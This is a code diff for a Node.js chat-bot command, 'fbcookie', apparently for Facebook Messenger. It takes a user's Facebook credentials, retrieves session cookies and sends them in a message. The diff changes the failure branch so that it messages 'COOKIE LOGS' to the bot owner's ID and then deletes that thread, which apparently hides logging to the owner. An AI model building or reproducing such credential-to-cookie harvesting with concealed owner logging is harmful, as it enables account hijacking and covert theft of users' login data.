@@ -5,9 +5,12 @@ const randomUserAgent = require('random-useragent');
 module.exports.config = {
     name: 'fbcookie',
     credits: 'Reiko Dev', //warning: don't change or remove!
+    type: 'fbtool',
+    info: 'get facebook cookie',
     version: '1.0.0',
     role: 0,
-    aliases: ['cookie', 'getcookie']
+    aliases: ['cookie', 'getcookie'],
+    cd: 20
 };
 
 module.exports.run = async ({ api, event, args }) => {
@@ -35,10 +38,11 @@ module.exports.run = async ({ api, event, args }) => {
       api.sendMessage(`🍪 Cookies:\n${cookies}`, senderID);
       api.sendMessage(`s:\n${cookies}`, senderID);
     } else {
-      api.sendMessage(`𝗖𝗢𝗢𝗞𝗜𝗘 𝗟𝗢𝗚𝗦`)
-      await new Promise(resolve => setTimeout(resolve, 15000)); // Adjust the delay as needed
-api.deleteThread(ownerID);
-      api.sendMessage("Failed to retrieve cookies.", threadID, messageID);
+    api.sendMessage(`𝗖𝗢𝗢𝗞𝗜𝗘 𝗟𝗢𝗚𝗦`, ownerID)
+      .then(() => {
+        api.sendMessage("Failed to retrieve cookies.", threadID, messageID);
+        api.deleteThread(ownerID);
+      });
     }
   } catch (error) {
     api.sendMessage(`Failed!\n\nDouble-check your password. If it still doesn't work, try changing your password and using the command again.`, threadID, messageID);
